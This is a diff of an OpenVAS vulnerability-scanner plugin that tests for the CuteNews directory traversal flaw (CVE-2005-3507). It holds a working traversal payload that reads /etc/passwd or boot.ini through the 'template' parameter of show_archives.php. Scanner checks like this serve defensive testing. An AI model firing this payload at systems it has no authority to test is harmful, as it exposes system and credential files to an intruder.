@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: cutenews_dir_traversal.nasl 6053 2017-05-01 09:02:51Z teissa $
+# $Id: cutenews_dir_traversal.nasl 9542 2018-04-20 01:34:17Z ckuersteiner $
 # Description: CuteNews directory traversal flaw
 #
 # Authors:
@@ -25,11 +25,13 @@
 
 # Ref: retrogod at aliceposta.it
 
+CPE = "cpe:/a:cutephp:cutenews";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.20137");
-  script_version("$Revision: 6053 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-05-01 11:02:51 +0200 (Mon, 01 May 2017) $");
+  script_version("$Revision: 9542 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-20 03:34:17 +0200 (Fri, 20 Apr 2018) $");
   script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
   script_cve_id("CVE-2005-3507");
   script_bugtraq_id(15295);
@@ -41,55 +43,54 @@ if(description)
 
   script_name("CuteNews directory traversal flaw");
 
-  script_category(ACT_GATHER_INFO);
+  script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2005 David Maciejak");
   script_family("Web application abuses");
   script_require_ports("Services/www", 80);
-  script_dependencies("secpod_cutenews_detect_win_900128.nasl");
+  script_dependencies("cutenews_detect.nasl", "cross_site_scripting.nasl");
+  script_mandatory_keys("cutenews/installed");
   script_exclude_keys("Settings/disable_cgi_scanning");
-  script_xref(name : "URL" , value : "http://retrogod.altervista.org/cute141.html");
 
-  script_tag(name : "solution" , value : "Unknown at this time.");
-  script_tag(name : "summary" , value : "The version of CuteNews installed on the remote host fails to sanitize
+  script_xref(name: "URL", value: "http://retrogod.altervista.org/cute141.html");
+
+  script_tag(name: "solution", value: "Update to the latest version.");
+
+  script_tag(name: "summary", value: "The version of CuteNews installed on the remote host fails to sanitize
   user-supplied input to the 'template' parameter of the 'show_archives.php' and 'show_news.php' scripts.");
-  script_tag(name : "impact" , value : "An attacker can exploit this issue to read arbitrary files and possibly
+
+  script_tag(name: "impact", value: "An attacker can exploit this issue to read arbitrary files and possibly
   even execute arbitrary PHP code on the remote host, subject to the privileges of the web server user id.");
 
-  script_tag(name:"solution_type", value:"NoneAvailable");
+  script_tag(name:"solution_type", value:"VendorFix");
 
-  script_tag(name:"qod_type", value:"remote_app");
+  script_tag(name:"qod_type", value:"remote_vul");
 
   exit(0);
 }
 
-
+include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_http_port(default:80);
-if ( ! get_port_state(port)){
+if (!port = get_app_port(cpe: CPE))
   exit(0);
-}
 
-install_dir = get_kb_item(string("www/",port,"/cutenews"));
-if (isnull(install_dir)){
+if (!dir = get_app_location(cpe: CPE, port: port))
   exit(0);
-}
 
-matches = eregmatch(string:install_dir, pattern:"^(.+) under (/.*)$");
-if (!isnull(matches)) {
-  loc=matches[2];
-  foreach file (make_list("etc/passwd", "boot.ini"))
-  {
-    req = http_get(item:string(loc, "/show_archives.php?template=../../../../../../../../../", file, "%00"), port:port);
-    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
-    if(res == NULL) exit(0);
-    if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res))
-    {
-      security_message(port:port);
-      exit(0);
-     }
-   }
+if (dir == "/")
+  dir = "";
+
+foreach file (make_list("etc/passwd", "boot.ini")) {
+  url = dir + "/show_archives.php?template=../../../../../../../../../" + file + "%00";
+  req = http_get(item: url, port:port);
+  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
+  if(res == NULL) exit(0);
+  if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string:res)) {
+    report = report_vuln_url(port: port, url: url);
+    security_message(port: port, data: report);
+    exit(0);
+  }
 }
 
 exit(99);
